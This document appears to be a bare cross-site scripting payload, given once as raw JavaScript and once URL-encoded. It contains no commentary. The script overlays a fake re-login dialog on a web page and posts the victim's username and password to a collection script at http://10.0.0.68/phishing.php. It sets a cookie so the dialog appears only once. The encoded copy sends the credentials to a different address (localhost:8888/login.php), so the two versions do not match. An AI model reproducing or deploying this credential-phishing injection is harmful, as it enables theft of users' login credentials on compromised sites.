<script>
    var html = `
<div id=\"bg\" style=\"position: absolute; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.5; top: 0; left: 0; margin: 0\">
</div>
<div id=\"form\" style=\"position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 280px; height: 185px; top: 50%; left: 40%; padding: 10px\">
    <p>An error occurred. Please login again.</p>
    <form method=\"POST\" action=\"http://10.0.0.68/phishing.php\">
        <p>Username <input type=\"text\" name=\"username\"></p>
        <p>Password <input type=\"password\" name=\"password\"></p>
        <p><input type=\"submit\" value=\"Login\"></p>
    </form>
</div> `;

    var expire = new Date();
    expire.setFullYear(expire.getFullYear() + 1);
    var cookie = "runonce=true; path=/; expires=" + expire.toUTCString();
    var div = document.createElement("div");
    if (document.cookie.indexOf("runonce=") < 0) {
        div.innerHTML = html;
        document.getElementsByTagName("body")[0].appendChild(div);
        document.cookie = cookie;
    }
</script>



url Encoded payload :
%3Cscript%3E%0A%20%20%20%20var%20html%20%3D%20%60%0A%3Cdiv%20id%3D%5C%22bg%5C%22%20style%3D%5C%22position%3A%20absolute%3B%20z%2Dindex%3A%20100%3B%20width%3A%20100%25%3B%20height%3A%20100%25%3B%20background%2Dcolor%3A%20%23000000%3B%20opacity%3A%200%2E5%3B%20top%3A%200%3B%20left%3A%200%3B%20margin%3A%200%5C%22%3E%0A%3C%2Fdiv%3E%0A%3Cdiv%20id%3D%5C%22form%5C%22%20style%3D%5C%22position%3A%20absolute%3B%20z%2Dindex%3A%20150%3B%20font%2Dfamily%3A%20Arial%3B%20background%2Dcolor%3A%20%23ffffff%3B%20width%3A%20280px%3B%20height%3A%20185px%3B%20top%3A%2050%25%3B%20left%3A%2040%25%3B%20padding%3A%2010px%5C%22%3E%0A%20%20%20%20%3Cp%3EAn%20error%20occurred%2E%20Please%20login%20again%2E%3C%2Fp%3E%0A%20%20%20%20%3Cform%20method%3D%5C%22POST%5C%22%20action%3D%5C%22http%3A%2F%2Flocalhost%3A8888%2Flogin%2Ephp%5C%22%3E%0A%20%20%20%20%20%20%20%20%3Cp%3EUsername%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%3E%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3Cp%3EPassword%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%3E%3C%2Fp%3E%0A%20%20%20%20%20%20%20%20%3Cp%3E%3Cinput%20type%3D%5C%22submit%5C%22%20value%3D%5C%22Login%5C%22%3E%3C%2Fp%3E%0A%20%20%20%20%3C%2Fform%3E%0A%3C%2Fdiv%3E%20%60%3B%0A%0A%20%20%20%20var%20expire%20%3D%20new%20Date%28%29%3B%0A%20%20%20%20expire%2EsetFullYear%28expire%2EgetFullYear%28%29%20%2B%201%29%3B%0A%20%20%20%20var%20cookie%20%3D%20%22runonce%3Dtrue%3B%20path%3D%2F%3B%20expires%3D%22%20%2B%20expire%2EtoUTCString%28%29%3B%0A%20%20%20%20var%20div%20%3D%20document%2EcreateElement%28%22div%22%29%3B%0A%20%20%20%20if%20%28document%2Ecookie%2EindexOf%28%22runonce%3D%22%29%20%3C%200%29%20%7B%0A%20%20%20%20%20%20%20%20div%2EinnerHTML%20%3D%20html%3B%0A%20%20%20%20%20%20%20%20document%2EgetElementsByTagName%28%22body%22%29%5B0%5D%2EappendChild%28div%29%3B%0A%20%20%20%20%20%20%20%20document%2Ecookie%20%3D%20cookie%3B%0A%20%20%20%20%7D%0A%3C%2Fscript%3E

